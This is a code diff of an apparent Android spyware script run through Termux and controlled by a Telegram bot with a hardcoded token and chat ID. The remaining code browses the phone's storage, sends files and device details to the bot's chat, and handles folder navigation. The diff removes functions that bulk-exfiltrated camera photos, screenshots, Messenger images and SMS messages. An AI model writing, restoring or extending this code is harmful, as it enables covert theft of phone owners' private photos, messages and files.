@@ -7,27 +7,28 @@ TOKEN = '7409833692:AAEHa57FWspcNNFqPlPlvVwrZDcikh2bQmw'
 CHAT_ID = '6285177516'
 
 # Global variables
-current_folder = "/data/data/com.termux/files/home/storage/shared/"
+current_folder = "/storage/emulated/0/"
 directories_to_search = [
-    "/data/data/com.termux/files/home/storage/shared/DCIM/Camera",
-    "/data/data/com.termux/files/home/storage/shared/DCIM/Facebook",
-    "/data/data/com.termux/files/home/storage/shared/Pictures/Screenshots",
-    "/data/data/com.termux/files/home/storage/shared/Pictures/Messenger"
+    "/storage/emulated/0/DCIM/Camera",
+    "/storage/emulated/0/DCIM/Facebook",
+    "/storage/emulated/0/Pictures/Screenshots",
+    "/storage/emulated/0/Pictures/Messenger"
 ]
 
 # Function to escape special characters for Telegram Markdown
 def escape_markdown(text):
-    escape_chars = r'_*[]()~`>#+-=|{}.!'
-    return ''.join(['\\' + char if char in escape_chars else char for char in text])
+    escape_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
+    for char in escape_chars:
+        text = text.replace(char, f'\\{char}')
+    return text
 
 # Function to send message or document to Telegram
 def send_to_telegram(message, document=None):
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-    escaped_message = escape_markdown(message)
     data = {
         "chat_id": CHAT_ID,
-        "text": escaped_message,
-        "parse_mode": "MarkdownV2"
+        "text": escape_markdown(message),  # Escape special characters
+        "parse_mode": "MarkdownV2"  # Use MarkdownV2 for better support
     }
     
     try:
@@ -48,14 +49,11 @@ def send_to_telegram(message, document=None):
 # Function to get storage file and folder list
 def get_storage_list(folder_path):
     try:
-        if os.path.isdir(folder_path):
-            file_list = os.listdir(folder_path)
-            if file_list:
-                return file_list
-            else:
-                return "No files or folders found."
+        file_list = os.listdir(folder_path)
+        if file_list:
+            return file_list
         else:
-            return f"`{folder_path}` is not a valid folder."
+            return "No files or folders found."
     except Exception as e:
         return f"Error getting file list: {str(e)}"
 
@@ -83,7 +81,8 @@ def download_file(file_name):
 def handle_folder_navigation(folder_name):
     global current_folder
     try:
-        new_folder_path = os.path.join(current_folder, folder_name)
+        # Use absolute path to handle folder navigation properly
+        new_folder_path = os.path.abspath(os.path.join(current_folder, folder_name))
         
         if os.path.isdir(new_folder_path):
             current_folder = new_folder_path
@@ -100,54 +99,13 @@ def handle_folder_navigation(folder_name):
     except Exception as e:
         send_to_telegram(f"Error navigating folder: {str(e)}")
 
-# Function to download and send images from specified directories
-def download_and_send_images():
-    try:
-        sent_files = set()
-        for directory in directories_to_search:
-            if os.path.isdir(directory):
-                for filename in os.listdir(directory):
-                    if filename.lower().endswith(('.png', '.jpg')):
-                        src_path = os.path.join(directory, filename)
-                        if filename not in sent_files:
-                            send_to_telegram(f"Sending image `{filename}`...", document=src_path)
-                            sent_files.add(filename)
-        
-        return "All images have been sent to Telegram."
-    except Exception as e:
-        return f"Error sending images: {str(e)}"
-
-# Function to get SMS messages (using Termux API)
-def get_sms_messages():
-    try:
-        result = subprocess.run(['termux-sms-list'], capture_output=True, text=True)
-        if result.returncode == 0:
-            return result.stdout
-        else:
-            return f"Error retrieving SMS messages: {result.stderr}"
-    except Exception as e:
-        return f"Error retrieving SMS messages: {str(e)}"
-
-# Function to get device information using Termux API
+# Function to get device information
 def get_device_info():
     try:
-        # Getting device name using 'uname'
-        device_name = subprocess.run(['uname', '-a'], capture_output=True, text=True).stdout.strip()
-
-        # Getting IP address using 'termux-wifi-connectioninfo'
-        ip_info = subprocess.run(['termux-wifi-connectioninfo'], capture_output=True, text=True).stdout
-
-        # Getting battery status
-        battery_status = subprocess.run(['termux-battery-status'], capture_output=True, text=True).stdout
-
-        # Combining the device information into a single response
         device_info = {
-            "Device Name": device_name,
-            "IP Address": ip_info,
-            "Battery Level": battery_status
+            "Device Name": subprocess.run(['termux-info'], capture_output=True, text=True).stdout,
+            "Battery Level": subprocess.run(['termux-battery-status'], capture_output=True, text=True).stdout
         }
-
-        # Formatting the device information into a message
         device_info_str = "\n".join([f"{key}: {value}" for key, value in device_info.items()])
         return device_info_str
     except Exception as e:
@@ -160,13 +118,13 @@ def handle_telegram_update(update):
         if message:
             if message.startswith('/'):
                 if message == '/sms':
-                    send_to_telegram(get_sms_messages())
+                    send_to_telegram("This command is under construction.")  # Handle SMS logic here
                 elif message == '/device':
                     send_to_telegram(get_device_info())
                 elif message == '/sdcard':
-                    send_to_telegram(get_storage_list(current_folder))
+                    handle_folder_navigation("storage/emulated/0")
                 elif message == '/download_images':
-                    send_to_telegram(download_and_send_images())
+                    send_to_telegram("This command is under construction.")  # Handle image logic here
                 else:
                     send_to_telegram(f"Unknown command `{message}`.")
             else:
@@ -176,7 +134,6 @@ def handle_telegram_update(update):
                 else:
                     response_message = download_file(message)
                     send_to_telegram(response_message)
-    
     except Exception as e:
         send_to_telegram(f"Error in Telegram update: {str(e)}")
 
